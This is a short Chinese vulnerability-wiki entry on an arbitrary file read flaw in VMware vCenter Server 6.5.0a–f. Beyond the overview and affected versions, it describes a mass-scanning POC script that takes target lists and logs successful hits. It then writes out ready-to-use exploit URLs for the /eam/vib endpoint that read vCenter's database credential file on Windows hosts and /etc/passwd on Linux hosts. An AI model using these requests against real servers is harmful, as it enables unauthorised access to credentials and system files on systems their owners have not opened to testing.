## 漏洞概述

VMware vCenter特定版本存在任意文件读取漏洞，攻击者通过构造特定的请求，可以读取服务器上任意文件

## 影响范围

```http
VMware vCenter Server 6.5.0a- f 版本
```

## POC

```bash
urls.txt用于存放目标HOST，然后直接运行此脚本即可 python vCenter-info-leak.py
漏洞验证成功的目标存放于success.txt，连接失败的错误信息存放于error.txt中
```

## EXP

[@佩奇文库](http://wiki.peiqi.tech)

**Windows主机**

```
http://xxx.xxx.xxx.xxx/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
```

![](http://wikioss.peiqi.tech/vuln/vm-2.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

**Linux主机**

```
https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd
```

![](http://wikioss.peiqi.tech/vuln/vm-3.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
